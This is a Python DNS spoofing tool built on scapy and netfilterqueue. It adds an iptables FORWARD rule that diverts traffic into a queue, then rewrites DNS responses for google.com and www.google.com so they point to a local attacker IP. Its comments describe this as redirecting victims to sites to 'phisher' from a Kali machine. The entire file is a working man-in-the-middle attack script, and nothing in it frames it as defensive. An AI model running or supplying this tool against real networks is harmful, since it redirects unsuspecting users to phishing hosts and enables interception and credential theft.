from scapy.all import *
from netfilterqueue import NetfilterQueue
import os

# DNS host records, for instance here, we want to spoof google.com
dns_hosts = {
    b"google.com.": "192.168.40.113", # change this
    b"www.google.com.": "192.168.40.113", # this too
}

def process_packet(packet):
    """
    Each time a new packet is redirected to the netfilter queue, this callback is called.
    """
    # convert a netfilter queue package into a scapy package
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        # If it's a DNS Packet : we modify it
        print("[BEFORE]:", scapy_packet.summary())
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            # No UDP packet, they can be IP/UDP error packets.
            pass
        print("[AFTER]:", scapy_packet.summary())
        # returned as a netfilter queue packet
        packet.set_payload(bytes(scapy_packet))
    # accept the packet
    packet.accept()

def modify_packet(packet):
    """
    Modifies the DNS response to match our `dns_hosts` dictionary. 
    For example, when we get a response from google.com, 
    this function replaces the real IP address with a fake IP address (192.168.40.113).
    """
    
    # Get the domain name of the DNS request
    qname = packet[DNSQR].qname
    if qname not in dns_hosts:
        # If the site is not in our list of sites to phisher, we do not modify it
        print("NO MODIF", qname)
        return packet
    # create a new response, replacing the original response
    # set the rdata for the IP we want to redirect (spoofed)
    # google.com -> 192.168.40.113 (kali machine)
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    # set the number of answers to 1
    packet[DNS].ancount = 1
    # remove the checksums and the length of the package, because we have modified the package
    # new calculations are needed (scapy will do it automatically)
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    # return the modified packet
    return packet



if __name__ == "__main__":
    QUEUE_NUM = 0
    # insert iptables FORWARD rule
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
    # instantiate netfilter queue
    queue = NetfilterQueue()
    try:
        # bind the queue number to our `process_packet` callback
        # and run it
        queue.bind(QUEUE_NUM, process_packet)
        queue.run()
    except KeyboardInterrupt:
        # end of the program, we do iptables flush
        os.system("iptables --flush")
